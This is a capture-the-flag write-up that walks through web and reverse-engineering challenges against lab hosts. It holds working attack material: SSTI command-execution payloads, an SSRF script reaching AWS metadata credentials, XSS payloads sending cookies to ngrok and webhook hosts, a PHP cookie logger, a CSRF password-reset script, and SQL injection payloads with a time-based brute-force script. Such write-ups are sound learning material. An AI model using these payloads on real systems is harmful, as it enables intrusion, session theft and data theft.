![](https://hackmd.io/_uploads/HJ76PfcTn.png)

We can create note and logout

Let us check the note creation function
![](https://hackmd.io/_uploads/r1wedzca3.png)

It can allow us use markdown format

And I got the web server is running `python` as it's programming language
![](https://hackmd.io/_uploads/SyOQdGq62.png)

First thing I tried was SSTI in the `contact` form
![](https://hackmd.io/_uploads/ry_wOMcTh.png)

On submitting that the payload got evaluated
![](https://hackmd.io/_uploads/HkSYdfc6n.png)

So we have SSTI

I just looked up a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread)

![](https://hackmd.io/_uploads/SJ0eFGqTn.png)

```
Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Submitting that confirms RCE
![](https://hackmd.io/_uploads/Hy3QKG562.png)

From here I just checked what files are in the current directory
![](https://hackmd.io/_uploads/Sy6UKM56n.png)
![](https://hackmd.io/_uploads/SkPDYM9pn.png)

Cool the flag is there

So I just concatenate it
![](https://hackmd.io/_uploads/B1OiKfcpn.png)
![](https://hackmd.io/_uploads/HJ32tz9T3.png)

```
Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

And I got the flag

```
Flag: flag{smaller_than_medium_with_twice_the_bugs}
```

#### Incredibly Self-Referential 
![](https://hackmd.io/_uploads/rknbcM5Tn.png)

This challenge wasn't particularly hard but the slight hard thing there is to spot the response :slightly_smiling_face: 

Let's get to it :computer: 

On key note we should always take is the challenge description

It clearly states that it is running on a EC2 Web Service which of cause I didn't notice at first

Going over to the url shows this
![](https://hackmd.io/_uploads/H1VOqM5ph.png)


And again I didn't read this title this service offers I went on trying to upload various sort of files but after like 10 mins or so I read it and saw ohhh it allows upload of file and likely gives the metadata of the file uploaded

Two things to notice is that we can upload file remotely or just by uploading the file

The web server is `gunicorn` and python based from what wappalyser says
![](https://hackmd.io/_uploads/SJlcczqTh.png)

I tried to play with the remote file upload and got this
![](https://hackmd.io/_uploads/SkhTcGq63.png)
![](https://hackmd.io/_uploads/HJJ6qG5a2.png)

From the `User-Agent` header it is indeed a python based web language

And the version is interesting but when I searched it up for IDK maybe exploits or vuln I got nothing

I tried uploading a file and I got the image metadata (at least the web server "actually" does what it claims to do lool)
![](https://hackmd.io/_uploads/H10eoGqah.png)

We get the `Exiftool` version

But on searching again if there are any known vuln I got nothing :(

Back to the remote file upload

It is an obvious thing to try SSRF here

But the issue I had was I didn't see any response which made me know if it worked or not

And this was the main issue
![](https://hackmd.io/_uploads/ryMBjz563.png)

After a while of trying various things I tried the SSRF again but this time checked the page source

And boom we have the base64 encoded value of the result
![](https://hackmd.io/_uploads/H1Iwjfca3.png)

Ok now what?

Trying things like port fuzzing works but didn't lead anywhere

So back to the challenge description we know that it is running in a AWS EC2 Instance

And on [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#aws), there's a way to enumerate interesting files there via SSRF

And that's what I'm going to do here

I made a [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/web/incredibly%20self-referential/ssrf.py) to automate the stress :slightly_smiling_face: 

```python
import requests
import re
from base64 import b64decode

url = 'https://ctftogo-very-meta.chals.io/'
files={"file": "file"}

while True:
    try:
        inp = input('-$ ')
        if inp.lower() != 'q':
            data={"link": inp}
            response = requests.post(url, files=files, data=data)
            r = re.search('base64,([^"]*)', response.text).group(1)
            decoded = b64decode(r).decode('utf-8')
            print(decoded)
        else:
            exit()
    except Exception as e:
        print(e)
```

Now we can use the script to enumerate the EC2 Instance via SSRF

So let us get the meta data endpoint
![](https://hackmd.io/_uploads/B1-AiG9a2.png)

Ok we have an endpoint named `latest`

Let us check it out
![](https://hackmd.io/_uploads/SkPk3Gqah.png)

Nice `meta-data` looks interesting

Checking it shows this
![](https://hackmd.io/_uploads/rk8bhf5pn.png)

Looking at the result I found this interesting
![](https://hackmd.io/_uploads/rJfQ2f5Th.png)

And on viewing it I got the flag
![](https://hackmd.io/_uploads/Byc4hGcan.png)

```
Endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/super-secret-admin-role
```

Here's the flag

```
Flag: flag{thats_the_most_effective_tactic_available}
```

#### Ayabavi
![](https://hackmd.io/_uploads/SyF4JX9Th.png)

Going over to the web url we can immediately tell it's running wordpress cms

We can try do things like username enumeration , plugins enumeration etc.

But I noticed this file
![](https://hackmd.io/_uploads/rJvKJmc6n.png)

And when I click it I figured it was a plugin
![](https://hackmd.io/_uploads/ryuC1QcT2.png)


I just took the quick guess that it's an outdated version and searched for exploit and found [this](https://www.exploit-db.com/exploits/48979)

When I ran it I figured it worked but no way of interacting with it

So I read the source code and had to modify it to a reverse shell
![](https://hackmd.io/_uploads/HkUUg75ph.png)

On running it I got the reverse shell
![](https://hackmd.io/_uploads/rJ3rbX5pn.png)

Next thing I did was to find the flag

Searching for common places didn't give the flag

So I decided to check the wordpress config file

Cause it holds the credential needed to access mysql

And I got the flag there
![](https://hackmd.io/_uploads/B1WjZm9pn.png)

```
Flag: flag{add_action(wordpress_plugins_strike_again!)}
```


#### Big Money
![](https://hackmd.io/_uploads/SkMgQQ5T3.png)

We are given a credential

```
bigspender95:winnerwinnerchickendinner
```

Going over to the url shows this
![](https://hackmd.io/_uploads/HJCQQmqa2.png)

I used the credential given to login
![](https://hackmd.io/_uploads/SycLm75T3.png)

It seems like a live chat application

To confirm I sent a word
![](https://hackmd.io/_uploads/HJDjXXcTh.png)

Immediately the support user replies back

I tried injecting html tag
![](https://hackmd.io/_uploads/ry-ENmqph.png)

Well that worked

So at this point it's obvious we need to perform XSS to steal the support user cookie

Here's the payload I used

First `index.php` contained this

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

I started an ngrok server then hosted the php script

Here's the javascript payload

```js=
<script>new Image().src='http://4.tcp.eu.ngrok.io:15322/index.php?c='+document.cookie</script>
```

I submitted that in the chat application

And back on my web server I got the support user cookie
![](https://hackmd.io/_uploads/BJZVSQ9p2.png)

![](https://hackmd.io/_uploads/ByifHQqpn.png)

To login as the user I just changed my current session cookie to that

But I figured that that cookie is still mine

Damn!! I switced to another payload

```js
<img src=x onerror=this.src='https://webhook.site/ffc8b5af-72ff-40af-82a0-2aa305eead84/?'+document.cookie;>
```

On the webhook site I switch to, I got lots of request
![](https://hackmd.io/_uploads/ByxawXcph.png)

And eventually I found a cookie that isn't the same as mine
![](https://hackmd.io/_uploads/ryqeu7qa3.png)

I replaced that with mine

```js
document.cookie="session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZOynmw.oGpzuEW3SVgPjieWANzqQmPum94"
```

On refreshing the page I got the flag
![](https://hackmd.io/_uploads/S1Lh_m56h.png)

```
Flag: flag{the_ca$h_money_wa$_in$ide_you_the_whole_time} 
```

#### Milouuu
![](https://hackmd.io/_uploads/rJjCum96h.png)

Going over to the web url shows this
![](https://hackmd.io/_uploads/BJxzYXcp3.png)

Some cool cats pictures

Clicking on the `Oopsie` button shows this
![](https://hackmd.io/_uploads/HJILFmq6h.png)
![](https://hackmd.io/_uploads/Hk9NtQ9Tn.png)

Reading it shows:

```
 I am leaking his database schema because he is hiding a terrible secret! Please, expose him!
 ```
 
 From the look of it we can conclude that it seems to be the table and it's content

And the `flags` table contain `flag` column

What we can kinda assume here is that there's SQL Injection

To confirm it we have a search function too
![](https://hackmd.io/_uploads/rkTKtm9p3.png)

When I submit a single quote I got this error
![](https://hackmd.io/_uploads/Skp9t75T3.png)

So let us check the column where our input will be reflected on the page
![](https://hackmd.io/_uploads/H1TTKm563.png)
```
' union select 1,2,3,4 from cats -- -
```

Cool now that we have that we can get the flag
![](https://hackmd.io/_uploads/HJSb9Xq6n.png)
```
' union select 1,flag,3,4 from flags -- -
```

I got the flag

```
Flag: flag{c4t5_w4s_a_h0rr0r_m0v13}
```

#### Fafame
![](https://hackmd.io/_uploads/By6u5Q5an.png)


Going over the url shows this
![](https://hackmd.io/_uploads/rJTcq75a3.png)

We have the option to register and login

So I will register since I don't have any credentials

After I registered I got this
![](https://hackmd.io/_uploads/Hya6cX5a3.png)
![](https://hackmd.io/_uploads/Hyj09m5T2.png)

From that we can see we would be able to write any html tag but javascript is disabled

When I clicked create `New` note I got this
![](https://hackmd.io/_uploads/SkA-sX9an.png)

I can inject any tag I want
![](https://hackmd.io/_uploads/HJ_XjXcT2.png)

After creating it I got this
![](https://hackmd.io/_uploads/rJh8i7q63.png)

Ok it actually allows any tag 

But it isn't executed

We can share the note to the admin
![](https://hackmd.io/_uploads/S1idi7963.png)

I tried to inject script tag to alert 'test'
![](https://hackmd.io/_uploads/r1kbh79T3.png)
![](https://hackmd.io/_uploads/rktLnX96h.png)

But it didn't work though the tag is there

The interesting thing to think is that why isn't that javascript executing?

Well if you take a look at debug console you will see this
![](https://hackmd.io/_uploads/Sy65379a3.png)

There's CSP which would prevent us from performing XSS

But actually the response gives the nonce
![](https://hackmd.io/_uploads/H1zlp79a3.png)

So because we have that we can bypass the CSP

Looking around the web app shows this function
![](https://hackmd.io/_uploads/ryKfTX5T2.png)

We can reset our password

Now this is interesting because we know that we can share our note to the admin user and we have XSS 

So this gives us an opportunity to escalate the XSS to CSRF
 
This is the request made when resetting a password
![](https://hackmd.io/_uploads/rkjspX963.png)
![](https://hackmd.io/_uploads/H1f5aX9T3.png)

We can now leverage this to change the admin password

Here's the exploit script

```js
<script nonce=2726c7f26c>

  const url = 'https://ctftogo-b6247a6b4d3c-markdown-1.chals.io/profile';
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=chained',
  });

</script>
```

I created a note with that content
![](https://hackmd.io/_uploads/BkTZCXqT3.png)

Then I shared it to admin
![](https://hackmd.io/_uploads/S1Cr0Xqan.png)

We can now login with `admin:chained`
![](https://hackmd.io/_uploads/r1JsAmca2.png)

And the flag is shown after login in

```
Flag: flag{look_at_me_im_the_admin_now} 
```

#### Maïmouna
![](https://hackmd.io/_uploads/HkbmH2oTn.png)

We are given a credential to login as:

```
mouse:dbjkfr894
```

Going over to the url shows this
![2023-08-29_19-14](https://github.com/markuched13/CTFLearn/assets/113513376/57c5b867-9e2b-432e-b47c-c9d1d791199d)

A login page!! We can use the credential given to login
![1](https://github.com/markuched13/CTFLearn/assets/113513376/4837aa2a-97ea-45f0-9d29-23c7fb0ccfb4)

Nothing interesting since it just goes to `/login` and no flag is there

One thing we can try again here is SQL Injection on the login page

Doing that I bypassed the login authentication
![image](https://github.com/markuched13/CTFLearn/assets/113513376/efca25ed-de25-4987-89f5-540a88e4d834)
![1](https://github.com/markuched13/CTFLearn/assets/113513376/7a31ecba-86e7-4f2a-b028-52e8a192ad14)

Ok so presumely we should be logged in as admin since that query will log us as the first user

But the flag isn't there??

But since we've confirmed SQL Injection it's ideal we dump the database

Let's start our injection!

I'll use burp suite as I find it easier to deal with first

My injection will be in the username parameter of the request

Using the `ORDER BY` query I can get the number of columns
![image](https://github.com/markuched13/CTFLearn/assets/113513376/33267016-497d-45b3-af40-d42792b670b8)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/a60f54b0-7e20-4e01-a4ee-68ca2526fe4b)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/982189b1-f442-4dd1-b57d-217afca9f5cd)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/9f405a82-4f8a-48e4-af08-402adfffa6fd)

```
Payloads:
- a' order by 1 -- -
- a' order by 2 -- -
- a' order by 3 -- -
- a' order by 4 -- -
```

We can see that on the 4th column we get an error

This means there are 3 columns

Looking at the request again we see that we can’t use UNION injection to leak the database since the web application just redirects to `/login` and doesn't give an error 

Making the vulnerability a Blind SQL Injection which is a bit technical compared to UNION Injection.

Next I decided to test for a Time-based Injection

Basically we use time delays to determine where an injection returned a valid result or not

I inserted `SLEEP` query to check for time based sql injection
![image](https://github.com/markuched13/CTFLearn/assets/113513376/bda8f7b0-bfb6-4b75-88e5-f891c42f39b9)

```
Payload: a' UNION SELECT NULL,NULL,NULL AND sleep(5) -- -
```

Since the web application took 5 seconds before it gave the response this means we've confirmed Time Based Injection


So by using the time delay we can leak the database content one character at a time. 

How?????

If the query is valid the request will sleep for the amount of time specified and if the query is not valid the request will will return immediately.

Using a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind-with-like), We can started leaking the contents from the database

The payload below will leak the database name the web application is using

```sql
(select sleep(10) from dual where database() like '%')
```

The query above will sleep for 10 seconds of the database is like `%`

The `%` in MySQL acts as a wildcard meaning if we read the query again is simply say, sleep 10 second is the database string is anything

This query should always sleep for 10 seconds because the statement is True

Now to build on our query we will starting brute forcing characters on the left of the wild card. 

For Example:

```
a' AND (select sleep(10) from dual where database() like 'a%');-- -
```

This query will sleep for a period of 10 seconds if the database letter starts with `a` and any other characters in front **(remember % == wildcard)*

If it's true then we start brute forcing the second character

```
a' AND (select sleep(10) from dual where database() like 'ab%');-- -
```

This query will sleep for a period of 10 seconds if the database letter starts with `a` followed by `b` and any other characters in front

So we will loop through the entire alphabet and digits and special characters and when the request sleep by 10 seconds we’ll believe that the character we were brute forcing at the period of time is probably the correct character. 

To make the process a little less tedious I created a python script that automates the process of brute forcing characters

Here's what my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/web/Ma%C3%AFmouna/enumerate.py) will do:
- Enumerate database name
- Get the mysql name
- Enumerate table

Here's my solve script

```python
import string
import requests
import time
import sys

# Trash script made by HackYou to enumerate Blind /Time based SQLI 

def bf_db():
    chars = string.printable[:-6]
    session = requests.session()
    url = "https://ctftogo-3-mice.chals.io/login"

    print('[+] Started brute forcing')
    phew = ""
    while True:
        for char in chars:
            name = f"{phew}{char}"
            sys.stdout.write(f"\r[+] Database name: {name}")
            payload = f"a' UNION SELECT NULL,NULL,NULL AND (select sleep(5) from dual where database() like '{name}%') #"
            data = {
                "username": payload,
                "password": "pass"
            }
            time_started = time.time()
            output = session.post(url, data=data, allow_redirects=False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                phew += char
                break
       
def bf_mysql():
    chars = string.printable[:-6]
    session = requests.session()
    url = "https://ctftogo-3-mice.chals.io/login"

    phew = ""
    while True:
        for char in chars:
            name = f"{phew}{char}"
            sys.stdout.write(f"\r[+] Mysql name: {name}")
            payload = f"a' UNION SELECT NULL,NULL,NULL AND (select sleep(5) from dual where BINARY version() like '{name}%') #"
            data = {
                "username": payload,
                "password": "pass"
            }
            time_started = time.time()
            output = session.post(url, data=data, allow_redirects=False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                phew += char
                break

def bf_table():
    # I need to know web tbh this portion doesn't give full name so I guessed the remainng part :P
    chars = string.printable[:-6]
    session = requests.session()
    url = "https://ctftogo-3-mice.chals.io/login"

    phew = ""
    while True:
        for char in chars:
            name = f"{phew}{char}"
            sys.stdout.write(f"\r[+] Table name: {name}")
            payload = f"a' UNION SELECT NULL,NULL,NULL and (select sleep(5) from dual where (select table_name from information_schema.tables where table_schema=database() and table_name like '%{name}%' limit 0,1) like '%') #"
            data = {
                "username": payload,
                "password": "pass"
            }
            time_started = time.time()
            output = session.post(url, data=data, allow_redirects=False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                phew += char
                break

if __name__ == "__main__":
    #bf_mysql()
    bf_db()
    #bf_table()

# [+] Mysql name: 10.11.4-MariaDB
# [+] Database name: mice_book
# [+] Table name: flags
# [+] Flag: flag{3_bl1nd_m1ce_s33_h0w_th3y_run}
```

The server is a bit overloaded at the moment of writting this so running the script will give likely false result atm

But when I ran it when the server was ok I got:

```
[+] Mysql name: 10.11.4-MariaDB
[+] Database name: mice_book
[+] Table name: ags #original
[+] Table name: flags #guessed
```

For some reason the table name wasn't complete don't blame me I suck at scripting and web

But it's actually guessable `flags`

Now this is where the issue I had was

I couldn't get the flag from the table 

So I switched over to sqlmap 😭

Passing the known values and dumping the flag (this way more better tbh 🙂)

Since the table name is  `flags` then we can also guess the column name to be `flag` 

I did this assumption cause running sqlmap was pretty slow

But it turned out right lol
![image](https://github.com/markuched13/CTFLearn/assets/113513376/492064cc-2892-44a8-ad5f-ce4d533be054)

```
Payload: sqlmap --url https://ctftogo-3-mice.chals.io/ --forms -D mice_book -T flags -C flag --dump
```

Doing that I got the flag

```
Flag: flag{3_bl1nd_m1ce_s33_h0w_th3y_run}
````

### Reverse Engineering 8/8

#### Saint Rings
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b51dbf27-fcf5-442e-bc4a-c0ee7aa7927e)

We are given a binary attached and from the challenge name we can tell that we'll be using `strings` command to get the flag i.e `SainT RINGS`

After downloading the binary I just ran `strings` and `grepped` for the flag format which is `flag{`
![image](https://github.com/markuched13/CTFLearn/assets/113513376/0516c35e-e08b-488e-a3bd-b7176609bb1d)

Doing that I got the flag

```
Flag: flag{3asy_3n0ugh_t0_f1nd?}
```

#### Sesame
![image](https://github.com/markuched13/CTFLearn/assets/113513376/974166d1-ae5d-4ae2-9ea0-01d868cab3e4)

We are given a binary attached downloading it and checking the file type shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/f4d79aa2-f058-4dfd-b672-4abba52275aa)

This is a x64 binary which is dynamically linked and not stripped

The only protection not enabled is Canary (doesn't matter we ain't doing BOF) 

But since PIE is enabled that means during the program execution the memory address will be randmoized 

I decided to run it to know what it does
![image](https://github.com/markuched13/CTFLearn/assets/113513376/48ef3999-43e8-4767-b447-6f0fe617b529)

We can see that it asks for a key then on giving the wrong key shows an error

Looking at that this is a good candidate for angr 

But first let us decompile it and know what it does

I'll be using ghidra

Note that I'll be renaming some values to understand it well

Here's the main function
![image](https://github.com/markuched13/CTFLearn/assets/113513376/077ad6d0-b9bf-444f-9ff3-a5340700a388)
```c
undefined8 main(void)

{
  uint input;
  uint key;
  
  input = 0;
  key = getrand();
  printf("Enter the sesame key : ");
  __isoc99_scanf("%d",&input);
  if ((input ^ key) == 0xdeadc0de) {
    puts("Good!");
    puts("Password = RWNvV2FzQ1RGe1JhbmRvbV9mMHJfUmFuZG9tXz8/Pz8/fQ== \n");
    puts("Replace the ????? with the sesame value you found to get the Flag.\n");
  }
  else {
    puts("Wrong.");
  }
  return 0;
}
```

This is a fairly simple code and what it does is this:
- Calls the `getrand()` function and the result returned by that function is stored in the key variable
- Asks for the key and receives our input using `scanf`
- Does a bitwise `xor` operation on our input and the key and if the result returned is `0xdeadc0de` it returns `True` then `puts` Good! to standard output
- Else it `puts` Wrong.

The password seems to be encoded in base64

Decoding it gives this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/05ed96cc-d138-4618-9649-fac6c378fcb8)

So we're to replace the question mark `?` with the rigt input value

Our key function now is the `getrand()` function as it holds the value of the key

Reading it shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/d93f08c9-3ccb-4c19-b0e9-0b82e5a01521)
```c

void getrand(void)

{
  rand();
  return;
}
```

So this just calls `rand()` 

What that will do is get a random number but the issue is that since it isn't `seeded` that makes it less random 

Therefore the key will always be the same

Now that we know that let us get the key value

I'll be using dynamic debugging to get it in this case I'll use `gdb-gef` debugger

First I'll set a breakpoint in the `getrand()` function
![image](https://github.com/markuched13/CTFLearn/assets/113513376/eaf67a30-c61f-4d42-943d-09f732577c95)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/8a190b29-6553-4a00-adca-04fdab603a8f)

Now I'll disassemble the function to know the point it will return
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b93da948-b1e2-4b88-aa59-9a2ad787ce92)

So at `getrand+15` is where it will return

I'll set a breakpoint there and continue the program execution
![image](https://github.com/markuched13/CTFLearn/assets/113513376/5f0a2928-55b5-45a2-9119-e0a8ad87b96d)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/e8698a8d-b8eb-4ec8-92ab-a1db2ba1b0ae)

The value stored in the `rax` register holds the return value of any function

Looking at the rax I got the key random value
![image](https://github.com/markuched13/CTFLearn/assets/113513376/036e804f-1d0a-49c0-af33-f51b6d23fda6)

```
Key = 0x6b8b4567
```

Now that is settle we need to know the right input that meets this condition

```
input ^ 0x6b8b4567 = 0xdeadc0de
```

I just used `z3` to find the right input value that meets that constaint

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ecowas23/prequal/reverse%20engineering/sesame/solve.py)

```python
from z3 import *

def sesame(value):
    solver = Solver()

    key = BitVec('key', 32)

    constraint = (key ^ value) == 0xdeadc0de

    solver.add(constraint)

    if solver.check() == sat:
        model = solver.model()
        solution_key = model[key].as_long()
        return solution_key
    else:
        return None

value = 0x6b8b4567

solution = sesame(value)
if solution is not None:
    print(f"Solution found: key = 0x{solution:08X}")
else:
    print("No solution found.")
```

Running it gives this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/f388d81f-ee24-4e74-a6bd-cedfd1e7912c)

So we just convert that hex value to integer
![image](https://github.com/markuched13/CTFLearn/assets/113513376/d97e033f-5dba-4779-b5d7-341904b67f48)

And that value will be the right input
![image](https://github.com/markuched13/CTFLearn/assets/113513376/a06b0dff-d73f-480a-aa39-c0caeb1b50a3)

Now the flag is

```
Flag: EcoWasCTF{Random_f0r_Random_3039200697}
```

#### Veyize
![image](https://github.com/markuched13/CTFLearn/assets/113513376/90c3d16a-d528-45d0-a9d1-75c0be8b9f5e)

This challenge was actually not solve by me 😢

Few days before this CTF, someone I know sent me his writeup to solve that in one of the recently concluded Ancy Togo CTF

So I noticed it was the same lol

Anyways here's the detailed solution to solve that

[Solution](https://github.com/w31rdr4v3n/_CTF/tree/main/Ancy_Togo_CTF_2023#reverse)

```
Flag: flag{32B1t_b0mB_l48_compl3te}
```

#### Petstar
![image](https://github.com/markuched13/CTFLearn/assets/113513376/a615d0cd-6b5d-45e5-add8-ddcbbe911d8e)

Damn a `.exe` binary 💀

At first I already felt afraid cause I hate decompiling `.exe` binary but this wasn't too hard and it was understandable (most times it requires dynamic debugging and I use Linux 😭)

Downloading the binary and checking the file type shows this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/3501cd21-af8c-42bf-8ae6-e3289355b7d3)

I will run it to know what it does
![image](https://github.com/markuched13/CTFLearn/assets/113513376/6653a50b-d41e-4cd1-8c87-81bbbe722d8a)

It gives us 4 options

```
1. Make a purchase but amount must equal 0x1337
2. Check acount balance
3. Increase account balance
4. Quit
```

Now that we have a basic understanding of what this program does let us decompile and read some source code 🙂

Using ghidra I'll decompile it 

I searched for strings 
![image](https://github.com/markuched13/CTFLearn/assets/113513376/b34a6a0b-8c30-49f3-93de-110056b785da)

Then could get to the main function 
![image](https://github.com/markuched13/CTFLearn/assets/113513376/556b8eec-8361-43c0-847c-be74b0d21840)

Here's the main function
![image](https://github.com/markuched13/CTFLearn/assets/113513376/3e63606a-b8f9-4532-9bf4-93e2545599b3)
![image](https://github.com/markuched13/CTFLearn/assets/113513376/6af3a6b0-74b3-4524-ac2f-09de39050ae1)
```c
int __cdecl main(int _Argc,char **_Argv,char **_Env)

{
  double increase_amount_by;
  int choice;
  undefined4 leet;
  int long_int_amount;
  byte attempt;
  uint balance;
  
  __main();
  balance = 0x50;
  attempt = 0;
LAB_1400015ea:
  printf("Menu:\n");
  printf("1- Make a purchase (amount = 0x1337 EcoWas)\n");
  printf("2- Check account balance\n");
  printf("3- Increase account balance\n");
  printf("4- Quit\n");
  printf("Choice: ");
  scanf("%d",&choice);
  if (choice == 4) {
    printf("Thank you for using our service!\n\n");
    return 0;
  }
  if (choice < 5) {
    if (choice == 3) {
      if (attempt == 0) {
        attempt = 1;
        printf("Number of Attempts: %d, Enter the increase amount: ",1);
        scanf("%lf",&increase_amount_by);
        long_int_amount = (int)(longlong)increase_amount_by;
        if (increase_amount_by == 4839.0) {
          printf("You cannot increase your account by 0x12e7 EcoWas.\n\n");
          printf("Your account balance is %d EcoWas.\n\n",(ulonglong)balance);
        }
        else {
          balance = long_int_amount + balance;
          if ((int)balance < 0) {
            printf("Invalid increase amount. The balance after increase would be negative.\n\n");
            balance = 80;
            printf("Your account balance is %d EcoWas.\n\n",80);
          }
          else {
            printf("Account increased by %d EcoWas. New balance: %d EcoWas\n",
                   (longlong)increase_amount_by & 0xffffffff,(ulonglong)balance);
          }
        }
      }
      else {
        printf("You can no longer increase your account value. Number of Attempts: %d.\n\n",
               (ulonglong)(attempt ^ 1));
      }
      goto LAB_1400015ea;
    }
    if (choice < 4) {
      if (choice == 1) {
        leet = 0x1337;
        if (balance == 0x1337) {
          printf("Purchase complete!\n");
          if (attempt == 0) {
            printf("You must first increase your account value.\n\n");
          }
          else {
            printf("Congratulations! You have purchased the super flag!\n\n");
            printf(
                  "Password = OQ2EAKBSIRZCK5KMOY4DASSAIYYHMQCFGA5EKMBDHI4DSRJQNZXG43TOJY====== \n\n"
                  );
            printf("Replace the ????? with the value you found to get the Flag.\n\n");
          }
        }
        else {
          printf("The value of your account must be 0x1337.\n\n");
        }
      }
      else {
        if (choice != 2) goto LAB_1400017f1;
        printf("Current balance: %d EcoWas\n\n",(ulonglong)balance);
      }
      goto LAB_1400015ea;
    }
  }
LAB_1400017f1:
  printf("Invalid choice. Please select a valid option.\n\n");
  goto LAB_1400015ea;
}
```

First thing to notice is the password which we can assume is the flag:

```
Password = OQ2EAKBSIRZCK5KMOY4DASSAIYYHMQCFGA5EKMBDHI4DSRJQNZXG43TOJY======
```

Decoding it gives this
![image](https://github.com/markuched13/CTFLearn/assets/113513376/59813bfc-2bea-4c0f-a8ad-01a1a30a5d89)
```
EcoWasCTF{Gg_you_Got_it_Right_?????}
```

So we will replace the question mark `?` with the value used to get the flag (that's according to what's on the code)

Now that we know that I'll explain what the program does:

We are given four options

Here's what option 1 does:
- It sets the variable `leet` to `0x1337`
- Does an if comparison on our current balance to the leet variable value
- If that compare returns True then we get to the win part where it prints out the flag and some words
- Else it prints that the value in our balance must equal `0x1337`

Here's what option 2 does:
- This will show us out current balance

Here's what option 3 does:
- The attempt variable is set to 0
- Then it checks if the value stored in the attempt variable to 0
- If it returns True then it sets it to 1
- Then it receives our input using `scanf`
- It then converts our input to long integer
- A check is done to compare our converted integer input to `4839`
- If the check returns True we get an error saying we can't increase our balance by that amount
- Else it sums up our current balance with our received input
- The balance is initialized to `80` on the stack
- It then checks if the balance is less than `0` this is to prevent using negative integer as our input
- If it is then it prints out some error saying invalid amount
- Else it does this math on our input: `input & 0xffffffff`
- It then sets our attempt to `0` since it will xor 1 ( our current attempt value with 1 )

Here's what option 4 does:
- It just basically exits


Now that we know that our aim is to make the purchase in option 1

Normally we can just do this:
![image](https://github.com/markuched13/CTFLearn/assets/113513376/28efe47e-762d-4e6b-bb24-69e0448fc9ff)
```
➜  petstar python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> current = 80
>>> goal = 0x1337
>>> amount = goal - current
>>> amount
4839
>>>
```

That's the number required to increase our balance to the expected value

But the issue is a check is done that compares the value of what we want to increase by with `4839`

So we can't use that

Then how can we get to that expected value?

Well look at this:

```c
printf("Account increased by %d EcoWas. New balance: %d EcoWas\n", (longlong)increase_amount_by & 0xffffffff,(ulonglong)balance);
```

It will use bitwise `AND` operation on our input with this large hex value `0xffffffff`

So basically what bitwise `AND` does is that when both bits are the same i.e `1 and 1` , the corresponding result bit is set to the value i.e `1`

And in C language when you define a variable the specific amount of space is allocated to store that data in memory , a variable defined as int data type in C will occupy 4 bytes of space

![image](https://github.com/markuched13/CTFLearn/assets/113513376/8b62972b-2343-4e0f-b8e2-bd0aa35fa6aa)

You can't assign values which take more space to store in memory.

When you try to do that an overflow will occur, and the overflowed bits will be ignored.
```c
#include <stdio.h>


void main()
{
  unsigned int integer = 4294967295;

  printf("%d",integer+1);
}
```

Rather than showing 4294967296, which is the expected result the program printed 0 . 

This happed because, integer variable is declared as a unsigned integer and the range of values which can be stored in 4 bytes of space is 0 - 0xffffffff (2 ** 32 -1 ).

Thus adding one will cause an overflow ( 1 + 0xffffffff = 0x100000000 ) and the extra bit will be ignored and the result becomes 0

Now that we know that, when we give the program `0xffffffff + 1` as the amount we want to increase, our balance will set to `0`

This is good cause now we can just do this `0xffffffff + 4839 + 1` which will then make our balance to be `0x1337` and that's enough to make a purchase

So let's get to it
![image](https://github.com/markuched13/CTFLearn/assets/113513376/05d06a2f-6921-4c3e-83bc-aa156dab6c49)
```python
➜  petstar python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xffffffff + 4839 + 1
4294972135
>>>
```

So the value we will increase our amount by is `4294972135`

Doing that worked
![image](https://github.com/markuched13/CTFLearn/assets/113513376/4998212d-2af6-4633-b1e1-8167ffa203d5)

Now we have the flag

```
Flag: EcoWasCTF{Gg_you_Got_it_Right_4294972135}
```

#### DotNetBin
![image](https://github.com/markuched13/CTFLearn/assets/113513376/03ef98ee-e343-46bf-8242-401e42ef735b)

Downloading the attached file shows it's a `.NET` binary
![image](https://github.com/markuched13/CTFLearn/assets/113513376/509a2545-7171-4e23-9190-6de6e5fb0c44)

I don't have `NET` library to run it but I can also just run it on my Windows VM

